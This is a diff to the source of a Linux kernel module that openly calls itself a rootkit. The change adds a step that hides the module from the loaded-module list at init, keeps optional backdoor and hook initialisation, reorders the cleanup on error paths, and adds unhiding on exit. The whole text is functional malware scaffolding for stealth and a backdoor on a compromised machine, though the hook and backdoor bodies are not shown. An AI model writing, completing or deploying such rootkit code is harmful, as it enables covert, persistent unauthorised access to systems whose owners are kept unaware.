@@ -17,31 +17,42 @@
 //insmod
 static int lkm_init(void){
     printk("ROOTKIT: Starting Rootkit ---------------------------------\n");
+    if (HIDE_MODULE){
+    	if (hide_module() == -1){
+			printk(KERN_INFO "ROOTKIT: INIT ERROR hiding module\n");
+			goto err_hide;
+    	}
+	}
+
     if (hooks_init() == -1){
-        printk(KERN_INFO "ROOTKIT: ERROR HOOKS\n");
+        printk(KERN_INFO "ROOTKIT: INIT ERROR hooks\n");
         goto err_hooks;
     }
 
 	if (BACKDOOR){
         if (backdoor_init() == -1){
-            printk(KERN_INFO "ROOTKIT: ERROR BACKDOOR INIT\n");
-            return -1;
+            printk(KERN_INFO "ROOTKIT: INIT ERROR backdoor\n");
+            goto err_backdoor;
         }
     }
 
     if (proc_init() == -1){
-        printk(KERN_INFO "ROOTKIT: ERROR PROC\n");
+        printk(KERN_INFO "ROOTKIT: INIT ERROR proc\n");
         goto err_proc;
     }
 
 	return 0;
 
     err_proc:
-    hooks_exit();
+	backdoor_exit();
+
+	err_backdoor:
+	hooks_exit();
 
     err_hooks:
-    backdoor_exit();
+	unhide_module();
 
+	err_hide:
     return -1;
 }
 
@@ -50,6 +61,7 @@ static void lkm_exit(void){
     proc_exit();
 	if (BACKDOOR) backdoor_exit();
     hooks_exit();
+    if (hidden) unhide_module(); //I think lkm_exit won't be executed if the module is hidden
     printk("ROOTKIT: Finishing Rootkit ---------------------------------\n\n");
 }
 
